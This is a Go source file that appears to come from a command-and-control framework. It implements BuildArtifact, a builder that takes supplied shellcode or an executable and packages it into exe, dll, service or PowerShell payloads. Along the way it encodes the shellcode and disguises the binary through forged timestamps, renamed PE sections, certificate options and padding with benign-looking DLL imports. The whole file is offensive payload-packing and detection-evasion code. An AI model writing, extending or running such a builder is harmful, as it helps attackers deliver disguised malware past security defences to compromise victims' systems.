package payload

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
)

type BuildArtifactRequest struct {
	TemplateName   string `json:"template_name"`
	OutputType     string `json:"output_type"`
	ShellcodeB64   string `json:"shellcode_b64"`
	RawEXEB64      string `json:"raw_exe_b64"`
	EncodeType     string `json:"encode_type"`
	EncodeKeyHex   string `json:"encode_key_hex"`
	PESectionText  string `json:"pe_section_text"`
	PESectionData  string `json:"pe_section_data"`
	PESectionRdata string `json:"pe_section_rdata"`
	PESectionReloc string `json:"pe_section_reloc"`
	EntryPoint     string `json:"entry_point"`
	Timestamp      string `json:"timestamp"`
	TimestampDate  string `json:"timestamp_date"`
	CertOption     string `json:"cert_option"`
	CertOrg        string `json:"cert_org"`
	ImportDLLs     string `json:"import_dlls"`
	OutputFilename string `json:"output_filename"`
}

func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, error) {
	tmpl := DefaultArtifactTemplate(req.TemplateName)

	if req.OutputType != "" {
		tmpl.OutputType = req.OutputType
	}
	if req.PESectionText != "" {
		tmpl.PESections.Text = req.PESectionText
	}
	if req.PESectionData != "" {
		tmpl.PESections.Data = req.PESectionData
	}
	if req.PESectionRdata != "" {
		tmpl.PESections.Rdata = req.PESectionRdata
	}
	if req.PESectionReloc != "" {
		tmpl.PESections.Reloc = req.PESectionReloc
	}
	if req.EntryPoint != "" {
		tmpl.EntryPointTechnique = EntryPointTechnique(req.EntryPoint)
	}
	if req.Timestamp != "" {
		tmpl.Timestamp = TimestampOption(req.Timestamp)
		tmpl.TimestampValue = req.TimestampDate
	}
	if req.CertOption != "" {
		tmpl.CertOption = CertOption(req.CertOption)
		tmpl.CertOrg = req.CertOrg
	}
	if req.EncodeType != "" {
		tmpl.ShellcodeEncode = ShellcodeEncode(req.EncodeType)
	}
	if req.EncodeKeyHex != "" {
		tmpl.EncodeKey = req.EncodeKeyHex
	}
	if req.ImportDLLs != "" {
		tmpl.ImportManipulation = true
		tmpl.BenignImports = strings.Split(req.ImportDLLs, ",")
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-pack-*")
	if err != nil {
		return nil, "", fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	var payloadData []byte

	if req.ShellcodeB64 != "" {
		shellcode, err := base64.StdEncoding.DecodeString(req.ShellcodeB64)
		if err != nil {
			return nil, "", fmt.Errorf("shellcode base64: %w", err)
		}
		var encKey []byte
		if req.EncodeKeyHex != "" {
			encKey, err = hex.DecodeString(req.EncodeKeyHex)
			if err != nil {
				return nil, "", fmt.Errorf("invalid encode key hex: %w", err)
			}
		}
		if encKey == nil || len(encKey) == 0 {
			encKey = []byte(randomHex(8))
		}
		encoded, err := EncodeShellcode(shellcode, tmpl.ShellcodeEncode, encKey)
		if err != nil {
			return nil, "", fmt.Errorf("encode: %w", err)
		}
		payloadData = encoded
	} else if req.RawEXEB64 != "" {
		payloadData, err = base64.StdEncoding.DecodeString(req.RawEXEB64)
		if err != nil {
			return nil, "", fmt.Errorf("exe base64: %w", err)
		}
	} else {
		// The Go-loader build path is intentionally removed: its generated
		// source hardcodes an empty shellcode blob, so the compiled artifact
		// does nothing (getShellcode() returns nil and main() exits). Requiring
		// an explicit payload source keeps BuildArtifact from silently emitting
		// a non-functional binary.
		return nil, "", fmt.Errorf("no payload source provided: set shellcode_b64 or raw_exe_b64 to build an artifact")
	}

	if len(payloadData) > 0 {
		ts, _ := GenerateTimestamp(tmpl.Timestamp, tmpl.TimestampValue)
		ApplyTimestamp(payloadData, ts)
		if tmpl.PESections != (PESectionConfig{}) {
			ApplyPESectionNames(payloadData, tmpl.PESections)
		}
		if tmpl.ImportManipulation && len(tmpl.BenignImports) > 0 {
			if err := AddBenignImports(payloadData, tmpl.BenignImports); err != nil {
				return nil, "", err
			}
		}
	}

	ext := ".bin"
	switch tmpl.OutputType {
	case "exe", "service_exe":
		ext = ".exe"
	case "dll":
		ext = ".dll"
	case "ps1":
		ext = ".ps1"
	}
	filename := req.OutputFilename
	if filename == "" {
		filename = "artifact" + ext
	}
	if !strings.HasSuffix(strings.ToLower(filename), ext) {
		filename += ext
	}

	return payloadData, filename, nil
}
